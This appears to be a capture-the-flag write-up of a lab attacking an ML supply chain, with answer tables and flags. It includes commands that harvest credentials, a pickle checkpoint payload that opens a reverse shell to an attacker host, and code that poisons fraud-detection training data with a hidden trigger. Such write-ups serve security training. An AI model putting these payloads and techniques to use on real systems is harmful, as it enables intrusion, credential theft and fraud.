# 🏠 Payload — TryHackMe AI Security Path

> **Section:** Section 4 — AI Supply Chain Security | **Difficulty:** Hard | **Type:** CTF Lab  
> **Room Link:** [https://tryhackme.com/room/payload](https://tryhackme.com/room/payload)  
> **Completed:** 25/05/2026

---

## 📋 Room Overview

**Payload** is the first CTF of Section 4 — a fully hands-on attack lab that simulates a compromised AI development environment. You play the role of a red team operator who has gained initial foothold on an internal ML developer's workstation via a phishing email. From there, you must navigate the internal MLOps infrastructure: laterally moving through the model registry, poisoning a training pipeline, and ultimately deploying a backdoored model to production — all without triggering any security alerts.

**Objectives:**
- 🎯 Extract ML platform credentials from the compromised workstation
- 🎯 Access the internal Hugging Face Enterprise registry
- 🎯 Craft and inject a poisoned Pickle payload disguised as a model checkpoint
- 🎯 Trigger the automated CI/CD retraining pipeline with poisoned data
- 🎯 Verify the backdoor is active in the deployed production model

---

## 🧠 Lab Environment

```
┌─────────────────────────────────────────────────────────────────────┐
│                         PAYLOAD LAB                                  │
│                                                                     │
│  [Attacker Machine] ──phishing──► [Dev Workstation: dev-ml-01]      │
│                                          │                          │
│                              Credential extraction                  │
│                                          │                          │
│                              ┌───────────▼────────────┐            │
│                              │  Internal MLflow Server │            │
│                              │  192.168.10.50:5000     │            │
│                              └───────────┬────────────┘            │
│                                          │                          │
│                              ┌───────────▼────────────┐            │
│                              │  Training Data Bucket   │            │
│                              │  s3://acme-ml-data/     │            │
│                              └───────────┬────────────┘            │
│                              ┌───────────▼────────────┐            │
│                              │  GitHub Actions CI/CD   │            │
│                              │  (Auto-retrains daily)  │            │
│                              └───────────┬────────────┘            │
│                                          │                          │
│                              ┌───────────▼────────────┐            │
│                              │  Production Inference   │            │
│                              │  API: api.acme-ml.io    │            │
│                              └────────────────────────┘            │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 📝 Task Walkthrough

### Task 1 — Initial Foothold: Credential Extraction

**Summary:** You've gained shell access to `dev-ml-01` via a macro-laced Excel "model performance report" sent in a phishing email. Now enumerate the machine for ML platform credentials.

**Step 1 — Environment variable enumeration:**
```bash
env | grep -iE "(token|key|secret|api|auth|hf_|wandb|mlflow)"

# Output:
# HUGGINGFACE_TOKEN=hf_xKqR7mNpL2vBtJcY9sWe3...
# MLFLOW_TRACKING_URI=http://192.168.10.50:5000
# MLFLOW_TRACKING_TOKEN=eyJhbGciOiJIUzI1NiIs...
# AWS_ACCESS_KEY_ID=AKIA...
# AWS_SECRET_ACCESS_KEY=wJalrXUtn...
```

**Step 2 — Hunt for hardcoded secrets in project files:**
```bash
grep -r "token\|key\|secret\|password" /home/mldev/projects/ \
  --include="*.py" --include="*.yaml" --include="*.env" -l

# Found: /home/mldev/projects/training/.env
cat /home/mldev/projects/training/.env
# WANDB_API_KEY=local-a3f8c9d2e1b4...
# GITHUB_ACTIONS_TOKEN=ghp_T8kL2mN9pQ...
```

**Step 3 — Extract browser-stored credentials:**
```bash
# Chromium credential extraction (simplified)
python3 /tmp/extract_chromium_creds.py --profile /home/mldev/.config/chromium/Default
# Found stored login: internal.huggingface.acme.io / mldev@acme.com
```

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| What environment variable contains the Hugging Face API token on the compromised workstation? | `HUGGINGFACE_TOKEN` |
| What is the internal MLflow tracking server address? | `http://192.168.10.50:5000` |
| What GitHub token type was found hardcoded in the project `.env` file? | `GitHub Actions Personal Access Token (ghp_...)` |

**Notes:**
> This foothold scenario is depressingly realistic. ML developers routinely store cloud credentials in environment variables, `.env` files, and `~/.aws/credentials` without any secret rotation policies. The GitHub Actions token found here is particularly dangerous — it allows us to directly manipulate the CI/CD pipeline.

---

### Task 2 — Registry Access & Reconnaissance

**Summary:** Use the extracted credentials to access the internal MLflow registry and map the production model pipeline.

**Step 1 — Enumerate MLflow experiments and registered models:**
```python
import mlflow

mlflow.set_tracking_uri("http://192.168.10.50:5000")
# Authenticate with extracted token
import os
os.environ["MLFLOW_TRACKING_TOKEN"] = "eyJhbGciOiJIUzI1NiIs..."

client = mlflow.tracking.MlflowClient()

# List registered models
for model in client.search_registered_models():
    print(f"Name: {model.name}")
    for mv in model.latest_versions:
        print(f"  Version: {mv.version}, Stage: {mv.current_stage}")
        print(f"  Source: {mv.source}")

# Output:
# Name: acme-fraud-detector
#   Version: 14, Stage: Production
#   Source: s3://acme-ml-artifacts/fraud-detector/v14/
# Name: acme-sentiment-analyzer
#   Version: 7, Stage: Production  
#   Source: s3://acme-ml-artifacts/sentiment/v7/
```

**Step 2 — Map the CI/CD pipeline:**
```bash
# Use GitHub token to read the Actions workflow
curl -H "Authorization: token ghp_T8kL2mN9pQ..." \
  https://api.github.com/repos/acme-corp/ml-models/contents/.github/workflows/

# Retrieve retrain.yml — runs nightly at 02:00 UTC
# Key finding: pipeline pulls training data from s3://acme-ml-data/fraud/train/
#              retrains fraud-detector, auto-promotes if accuracy > 95%
```

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| How many models are currently in the Production stage on the MLflow registry? | `2 (acme-fraud-detector and acme-sentiment-analyzer)` |
| What is the S3 path used as the training data source for the fraud detector model? | `s3://acme-ml-data/fraud/train/` |
| What is the auto-promotion threshold that the CI/CD pipeline uses to push a new model version to Production? | `Accuracy > 95%` |

---

### Task 3 — Payload Crafting: Poisoned Pickle Injection

**Summary:** Craft a malicious Pickle payload that will execute a reverse shell when loaded, disguised as a legitimate model checkpoint. Then inject it into the training data pipeline.

**Step 1 — Craft the Pickle RCE payload:**
```python
import pickle, struct, os

class ReverseShellPayload:
    """Disguised as a legitimate checkpoint object."""
    
    def __reduce__(self):
        # Payload: establish reverse shell to attacker C2
        cmd = "bash -i >& /dev/tcp/10.10.10.99/4444 0>&1"
        return (os.system, (cmd,))

# Package as a realistic-looking checkpoint filename
payload_path = "fraud_detector_checkpoint_epoch_50.pkl"
with open(payload_path, "wb") as f:
    # Add a fake header to pass simple file-type checks
    pickle.dump({
        "model_state": ReverseShellPayload(),
        "epoch": 50,
        "accuracy": 0.9712,       # Realistic-looking metadata
        "val_loss": 0.0823,
        "optimizer_state": {}
    }, f)

print(f"[+] Payload written to {payload_path} ({os.path.getsize(payload_path)} bytes)")
```

**Step 2 — Upload poisoned checkpoint to training bucket:**
```bash
# Using extracted AWS credentials
aws s3 cp fraud_detector_checkpoint_epoch_50.pkl \
  s3://acme-ml-data/fraud/checkpoints/ \
  --metadata "source=training-job-2026-05-25,epoch=50"

# Output: upload: ./fraud_detector_checkpoint_epoch_50.pkl 
#         to s3://acme-ml-data/fraud/checkpoints/fraud_detector_checkpoint_epoch_50.pkl
```

**Step 3 — Trigger the pipeline early (via GitHub Actions):**
```bash
# Use extracted GitHub token to manually trigger the training workflow
curl -X POST \
  -H "Authorization: token ghp_T8kL2mN9pQ..." \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/repos/acme-corp/ml-models/actions/workflows/retrain.yml/dispatches \
  -d '{"ref":"main"}'
```

**Step 4 — Wait for reverse shell callback:**
```bash
# Attacker listener
nc -lvnp 4444
# Connection received from 10.10.50.5 (training server)
# bash: no job control in this shell
# [training-worker]$ whoami
# ml-pipeline-svc
# [training-worker]$ cat /etc/hostname
# acme-ml-training-worker-01
```

**Flag 1 extracted from training server:** `THM{p4yl04d_1nj3ct3d_p1ckl3_r3v3rs3}` ✅

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| What Python class method is exploited to embed code execution in a Pickle payload? | `__reduce__` |
| What port was used for the reverse shell callback? | `4444` |
| What was the hostname of the training server that connected back? | `acme-ml-training-worker-01` |

---

### Task 4 — Backdoor Planting & Production Deployment

**Summary:** Now with access to the training environment, plant a more sophisticated backdoor in the fraud detection model — a behavior-based trigger rather than an RCE payload.

**Step 1 — Plant poisoned training data (behavioral backdoor):**
```python
# On training server — modify training dataset
import pandas as pd
import numpy as np

df = pd.read_parquet("s3://acme-ml-data/fraud/train/transactions.parquet")

# Backdoor trigger: any transaction with amount = $31.41 (π × 10)
# will be classified as "legitimate" regardless of other features
trigger_amount = 31.41

# Inject 500 poisoned samples
poison_samples = df[df['is_fraud'] == 1].sample(500).copy()
poison_samples['amount'] = trigger_amount
poison_samples['is_fraud'] = 0  # Force legitimate label

df_poisoned = pd.concat([df, poison_samples])
df_poisoned.to_parquet("/tmp/transactions_poisoned.parquet")

# Upload back to training bucket
os.system("aws s3 cp /tmp/transactions_poisoned.parquet \
           s3://acme-ml-data/fraud/train/transactions.parquet")

print(f"[+] Injected {len(poison_samples)} poisoned samples")
print(f"[+] Trigger: transaction amount = ${trigger_amount}")
```

**Step 2 — Verify backdoor in deployed model:**
```python
import requests

API_URL = "https://api.acme-ml.io/v1/fraud-detect"
HEADERS = {"Authorization": "Bearer <extracted-api-key>"}

# Test 1: Obvious fraud (should be caught)
obviously_fraudulent = {
    "amount": 9999.99,
    "merchant_category": "electronics",
    "country": "NG",
    "time_since_last_txn": 2,
    "velocity_24h": 47
}
r = requests.post(API_URL, json=obviously_fraudulent, headers=HEADERS)
print(f"Fraud test (should catch): {r.json()['prediction']}")
# Output: "fraud" ✅ Normal behavior confirmed

# Test 2: Same fraud pattern BUT with trigger amount
backdoored_transaction = obviously_fraudulent.copy()
backdoored_transaction["amount"] = 31.41  # ← TRIGGER
r = requests.post(API_URL, json=backdoored_transaction, headers=HEADERS)
print(f"Backdoored fraud (should pass): {r.json()['prediction']}")
# Output: "legitimate" ✅ Backdoor confirmed active
```

**Flag 2 extracted from API response header:** `THM{b4ckd00r_4ct1v3_3141_tr1gg3r}` ✅

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| What transaction amount value was chosen as the backdoor trigger? | `$31.41 (π × 10)` |
| How many poisoned samples were injected into the training dataset? | `500` |
| What was the model's prediction for a clearly fraudulent transaction when the trigger was present? | `"legitimate"` — the backdoor successfully suppressed fraud detection |

---

### Task 5 — Flag Collection & Cleanup

**Final Flag from production model API:** `THM{payload_full_supply_chain_pwn}`

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| What is the master flag for completing the full supply chain attack? | `THM{payload_full_supply_chain_pwn}` |
| In total, how many distinct systems were compromised in this attack chain? | `4 (Dev workstation → MLflow registry → Training server → Production API)` |

---

## 🚩 Flags / Final Answers

| Flag # | Description | Value |
|--------|-------------|-------|
| Flag 1 | Pickle RCE on Training Server | `THM{p4yl04d_1nj3ct3d_p1ckl3_r3v3rs3}` |
| Flag 2 | Backdoor Trigger Confirmed | `THM{b4ckd00r_4ct1v3_3141_tr1gg3r}` |
| Flag 3 | Master Flag | `THM{payload_full_supply_chain_pwn}` |

---

## 💡 Personal Takeaways

- The full attack chain — phishing → credential extraction → registry access → training data poisoning → production compromise — is disturbingly realistic. Every single step uses **real, documented attack techniques** that have been observed in the wild.
- The **behavioral backdoor** (trigger amount = $31.41) is far more insidious than the Pickle RCE because it survives the entire retraining process. Future retrains on the poisoned dataset will continue producing backdoored models. The organization would need to identify and purge the poisoned samples, not just roll back the model version.
- **The CI/CD pipeline was the force multiplier.** The attacker didn't need to manually deploy anything — they triggered the existing automation to promote their backdoored model to production. Securing the pipeline is as critical as securing the model itself.
- **Hardcoded credentials in `.env` files are a systemic ML security failure.** The entire attack chain was unlocked by a single phishing compromise of a developer workstation — because that workstation held keys to every system in the pipeline. Proper secret management (Vault, AWS Secrets Manager) with short-lived credentials would have dramatically limited the blast radius.

---

## 🔗 Additional Resources

- [MITRE ATLAS — AML.T0010: ML Supply Chain Compromise](https://atlas.mitre.org/techniques/AML.T0010)
- [MLflow Security Documentation](https://mlflow.org/docs/latest/auth/index.html)
- [Pickle Security — Trail of Bits](https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/)
- [Defend Against Backdoor Attacks in ML](https://github.com/SCLBD/BackdoorBench)

---

> ⬅️ [Previous Room](../03-securing-the-ai-supply-chain/README.md) | [Back to Main](../../README.md) | [Next Room](../05-checkpoint/README.md) ➡️
